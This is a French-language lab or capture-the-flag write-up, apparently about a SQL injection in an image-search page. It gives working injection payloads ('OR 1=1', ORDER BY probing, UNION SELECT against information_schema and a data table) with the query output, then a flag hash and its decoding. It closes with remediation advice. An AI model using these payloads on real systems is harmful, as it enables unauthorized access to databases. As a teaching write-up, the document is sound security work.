# SQL Injection Image



## Description

Une SQL Injection est une faille de sécurité qui permet à un attaquant d'interférer avec les requêtes qu'une application envoie à sa base de données.  
Elle se produit lorsque des entrées utilisateur (comme des champs de formulaire ou des paramètres d'URL) sont mal validées ou mal échappées avant d'être insérées dans une requête SQL.  
Cette faille est l'une des plus anciennes et des plus dangereuses, car elle peut compromettre l'intégrité et la confidentialité des données stockées.


## Comment reproduire la faille

1. Aller sur la page de search image (**SEARCH IMAGE**) ou `http://<IP_ADRESS>/?page=searchimg`

2. Vérifier la vulnérabilité de l'input :
   - Saisir une valeur simple pour confirmer que la page est vulnérable :
     ```
     1 OR 1=1
     ```
   - Si la page affiche tous les résultats ou un comportement anormal, la faille est confirmée.

3. Déterminer le nombre de colonnes :
   - Utiliser `ORDER BY` pour identifier le nombre de colonnes attendues par la requête :
     ```
     1 ORDER BY 1
     1 ORDER BY 2
     1 ORDER BY 3
     ```
   - Si `1 ORDER BY 3` échoue, la requête originale utilise 2 colonnes.


4. Extraire les noms des colonnes des tables :
   - Lister les colonnes des tables :
     ```sql
     1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()
     ```

5. Extraire les données sensibles :
   - Afficher le contenu d'une table (par exemple, `list_images` avec 2 colonnes ex: url, title) :
        ```sql
        1 UNION SELECT title, comment FROM list_images
        ```

    - Resultat de la requête:
        ```
        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: Nsa
        Url : https://fr.wikipedia.org/wiki/Programme_

        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: An image about the NSA !
        Url : Nsa

        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: There is a number..
        Url : 42 !

        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: Google it !
        Url : Google

        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: Earth!
        Url : Earth

        ID: 1 UNION SELECT title, comment FROM list_images 
        Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
        Url : Hack me ?
        ```
6. Utiliser un outil pour décoder/encoder:
    - Décoder le hash MD5 `1928e8083cf461a51303633093573c46`, le résultat est `albatroz`
    - Encoder `albatroz` en SHA-256, le résultat est `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`



## Recommandation pour empêcher la faille

* Utiliser des requêtes paramétrées:
    * Ne jamais concaténer directement les entrées utilisateur dans une requête SQL.
    * Utiliser des requêtes préparées (Prepared Statements) avec des bibliothèques comme des frameworks ORM.

* Valider et filtrer les entrées utilisateur:
    * Valider que les entrées utilisateur correspondent au format attendu (par exemple, un entier pour un ID).
    * Utiliser une whitelist pour les valeurs autorisées.

* Limiter les permissions de la base de données
    * Le compte utilisé par l'application pour se connecter à la base de données doit avoir des permissions minimales (par exemple, pas de droits DROP TABLE ou SELECT sur information_schema).

* Désactiver l'affichage des erreurs SQL:
    * Ne pas afficher les erreurs SQL en production, car elles peuvent révéler des informations sensibles sur la structure de la base de données.

* Utiliser un WAF (Web Application Firewall):
    * Un WAF peut aider à bloquer les tentatives d'injection SQL en détectant les motifs suspects dans les requêtes.


## Conclusion

Cette faille de type SQL Injection est critique, car elle permet à un attaquant d'accéder à des données sensibles et potentiellement de prendre le contrôle de la base de données.  
En suivant les bonnes pratiques de développement sécurisé (requêtes paramétrées, validation des entrées, permissions minimales), il est possible de se prémunir efficacement contre ce type d'attaque.
